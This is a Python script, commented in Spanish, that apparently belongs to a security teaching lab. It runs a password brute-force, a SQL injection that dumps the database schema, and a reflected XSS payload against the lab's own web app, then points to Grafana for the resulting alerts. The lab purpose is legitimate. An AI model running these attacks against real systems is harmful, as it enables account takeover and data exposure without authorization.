"""Simula un ataque contra un entorno PROPIO del laboratorio para verlo en Grafana.

Uso (desde la carpeta laboratorio/):
    docker compose exec taller python3 scripts/simular_ataque.py http://jenkins:5000

Hace tres cosas y muestra si la app resistió:
1. Fuerza bruta: 30 intentos de login con claves comunes.
2. Inyección SQL en /alumnos/buscar.
3. XSS reflejado en /hello.
Úsalo solo contra los entornos de este laboratorio.
"""
import http.cookiejar
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

CLAVES = ["123456", "password", "qwerty", "secureDev", "letmein", "admin123", "root", "duoc2024",
          "abc123", "111111", "iloveyou", "welcome", "monkey", "dragon", "123123"] * 2 + ["admin"]


NAVEGADOR = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))


def pedir(url, datos=None):
    cuerpo = urllib.parse.urlencode(datos).encode() if datos else None
    try:
        with NAVEGADOR.open(urllib.request.Request(url, data=cuerpo), timeout=10) as r:
            return r.status, r.read().decode("utf-8", "replace"), r.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), e.headers


def main():
    if len(sys.argv) != 2:
        raise SystemExit("Uso: simular_ataque.py <url>   (ej.: http://jenkins:5000)")
    base = sys.argv[1].rstrip("/")

    print("== 1. Fuerza bruta en /login")
    # Como un navegador: abre la portada y reutiliza su cookie y su token anti-CSRF (si existe).
    token = re.search(r'name="csrf_token" value="([^"]+)"', pedir(base + "/")[1])
    extra = {"csrf_token": token.group(1)} if token else {}
    codigos = [pedir(base + "/login", {"usuario": "admin", "clave": c, **extra})[0] for c in CLAVES]
    exitos = [c for c, codigo in zip(CLAVES, codigos) if codigo == 200]
    bloqueados = codigos.count(429)
    print(f"   {len(CLAVES)} intentos. " + (f"¡CLAVE ENCONTRADA: '{exitos[0]}'!" if exitos else "Ninguna clave funcionó.")
          + (f" {bloqueados} intentos bloqueados (HTTP 429)." if bloqueados else ""))

    print("== 2. Inyección SQL en /alumnos/buscar")
    carga = "zzz' UNION SELECT 0, name, sql, 0 FROM sqlite_master --"
    estado, cuerpo, _ = pedir(base + "/alumnos/buscar?" + urllib.parse.urlencode({"nombre": carga}))
    try:
        filas = json.loads(cuerpo)
    except ValueError:
        filas = []
    filtrado = isinstance(filas, list) and any("CREATE TABLE" in str(f) for f in filas)
    print(f"   HTTP {estado}. " + ("¡La inyección expuso la estructura de la base de datos!" if filtrado
                                   else "La inyección no devolvió datos internos."))

    print("== 3. XSS reflejado en /hello")
    carga = "<script>alert('xss')</script>"
    estado, cuerpo, cabeceras = pedir(base + "/hello?" + urllib.parse.urlencode({"name": carga}))
    reflejado = carga in cuerpo and "html" in cabeceras.get("Content-Type", "")
    print(f"   HTTP {estado}. " + ("¡El script se refleja sin escapar en una página HTML!" if reflejado
                                   else "El script no se ejecutaría (se escapó o no es HTML)."))

    print("\nRevisa ahora el dashboard de Grafana: logins fallidos y peticiones sospechosas deberían subir.")


if __name__ == "__main__":
    main()
